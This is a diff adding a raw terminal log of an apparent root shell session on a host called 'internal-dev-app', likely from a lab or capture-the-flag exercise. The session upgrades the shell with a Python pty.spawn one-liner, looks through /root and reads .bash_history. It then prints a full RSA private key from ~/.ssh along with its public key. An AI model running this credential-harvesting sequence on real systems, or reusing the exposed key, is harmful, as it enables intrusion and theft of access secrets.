@@ -1,0 +1,76 @@
+hostname
+internal-dev-app
+whoami
+root
+whereis python
+python: /usr/bin/python3.6m /usr/bin/python3.6 /usr/lib/python3.6 /etc/python3.6 /usr/local/lib/python3.6
+/usr/bin/python3.6 -c 'import pty; pty.spawn("/bin/bash")'
+.]0;root@internal-dev-app: /.root@internal-dev-app:/# ls
+ls
+.[0m.[01;34mbin.[0m   .[01;34mdev.[0m  .[01;34mhome.[0m  .[01;34mlib64.[0m  .[01;34mmnt.[0m  .[01;34mproc.[0m  .[01;34mrun.[0m   .[01;34msrv.[0m  .[30;42mtmp.[0m  .[01;34mvar.[0m
+.[01;34mboot.[0m  .[01;34metc.[0m  .[01;34mlib.[0m   .[01;34mmedia.[0m  .[01;34mopt.[0m  .[01;34mroot.[0m  .[01;34msbin.[0m  .[01;34msys.[0m  .[01;34musr.[0m  velocity.log
+.]0;root@internal-dev-app: /.root@internal-dev-app:/# cd /root
+cd /root
+.]0;root@internal-dev-app: ~.root@internal-dev-app:~# ls
+ls
+.[0m.[01;34msources.[0m
+.]0;root@internal-dev-app: ~.root@internal-dev-app:~# ls -al
+ls -al
+total 36
+drwx------ 1 root root 4096 Jun 25 21:39 .[0m.[01;34m..[0m
+drwxr-xr-x 1 root root 4096 Jun 25 15:54 .[01;34m...[0m
+-rw------- 1 root root    0 Aug 25  2018 .bash_history
+-rw-r--r-- 1 root root 3183 Aug 25  2018 .bashrc
+-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
+drwx------ 2 root root 4096 Jun 25 21:39 .[01;34m.ssh.[0m
+-rw------- 1 root root 6622 Jun 25 21:39 .viminfo
+drwxr-xr-x 2 root root 4096 Aug 25  2018 .[01;34msources.[0m
+.]0;root@internal-dev-app: ~.root@internal-dev-app:~# cd .ssh
+cd .ssh
+.]0;root@internal-dev-app: ~/.ssh.root@internal-dev-app:~/.ssh# ls
+ls
+priv.pem  pub.pem
+.]0;root@internal-dev-app: ~/.ssh.root@internal-dev-app:~/.ssh# cat priv.pem
+cat priv.pem
+-----BEGIN RSA PRIVATE KEY-----
+MIICXAIBAAKBgQDSo1HHOcvenn8C52mtF/bUkWkmn4n/TNuNp8Anuhx1NmJni0gh
+QhTIk0G/uIYHDJJ/z66MJmS6NzysiLm5UjQKitL4HmGGn+i6RQehdrga7N0WZjVg
+5ThqCe5Dwue5BjxqtaYocOFVoz7N6uz4cxdHK37kmYxl1x7ztD75+ogv/QIDAQAB
+AoGABFyHW/WxZ/mmLZw3DvN5E+uy3q7c/6FKxoMbsnbjEfY/UV+L7cxde824xcx/
+UfQLsIPPXG2LFmQAaJ4oIlM2apvX4h3Tzlq/dxrY3HEYOKLg0TNNuKvQTmhOoTD6
+t5dyfFHvZoqTkIhLKhP3EQkedtLCerUlucQMg+O7CNSkBw0CQQDwnHJgTBJFQZZB
+Mi+QwbX5abPYqPGV5aZlzTRVstu4OKXU8764pzfEf0edXcbw1i2n/pcfU/BPRsv/
+DrvJScfvAkEA4Bweaoacbq8XgUsb4a/jtLufpzhNECEbb92eHu70qqDFXUJz6UGk
+Z8QrudFo7/SEoB5+OEypQ3/gunwp4Rf60wJBAKeYQW7j7eIBojg9TbZlx2w3/UaP
+vt7rPHEycx6yW6tBAfmH4jPafdTH10k8tcKxXNHkWr0+iWee5578Uz8Mvk8CQCVb
+CobfITwh210l0+PumZoKnDYXYGEL47Ll0fF+CzJV0hAVf5Sl6G2TeWZjzYYRz/mQ
+m6FuxdgGfMMY5zIp+RkCQDW752YJGEjUhMpXbnUrtQx8sMVX26kZMRyw/jBMa6ne
+EQ3ImmpYWT37c23+FkdBtz+/ErVR+eP83vfSFd4tiGY=
+-----END RSA PRIVATE KEY-----
+.]0;root@internal-dev-app: ~/.ssh.root@internal-dev-app:~/.ssh# cat pub.pem
+cat pub.pem
+-----BEGIN PUBLIC KEY-----
+MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDSo1HHOcvenn8C52mtF/bUkWkm
+n4n/TNuNp8Anuhx1NmJni0ghQhTIk0G/uIYHDJJ/z66MJmS6NzysiLm5UjQKitL4
+HmGGn+i6RQehdrga7N0WZjVg5ThqCe5Dwue5BjxqtaYocOFVoz7N6uz4cxdHK37k
+mYxl1x7ztD75+ogv/QIDAQAB
+-----END PUBLIC KEY-----
+.]0;root@internal-dev-app: ~/.ssh.root@internal-dev-app:~/.ssh# cd ../
+cd ../
+.]0;root@internal-dev-app: ~.root@internal-dev-app:~# cat .bash_history
+cat .bash_history
+.]0;root@internal-dev-app: ~.root@internal-dev-app:~# ls
+ls
+.[0m.[01;34msources.[0m
+.]0;root@internal-dev-app: ~.root@internal-dev-app:~# ls -al
+ls -al
+total 36
+drwx------ 1 root root 4096 Jun 25 21:39 .[0m.[01;34m..[0m
+drwxr-xr-x 1 root root 4096 Jun 25 15:54 .[01;34m...[0m
+-rw------- 1 root root    0 Aug 25  2018 .bash_history
+-rw-r--r-- 1 root root 3183 Aug 25  2018 .bashrc
+-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
+drwx------ 2 root root 4096 Jun 25 21:39 .[01;34m.ssh.[0m
+-rw------- 1 root root 6622 Jun 25 21:39 .viminfo
+drwxr-xr-x 2 root root 4096 Aug 25  2018 .[01;34msources.[0m
+.]0;root@internal-dev-app: ~.root@internal-dev-app:~# 
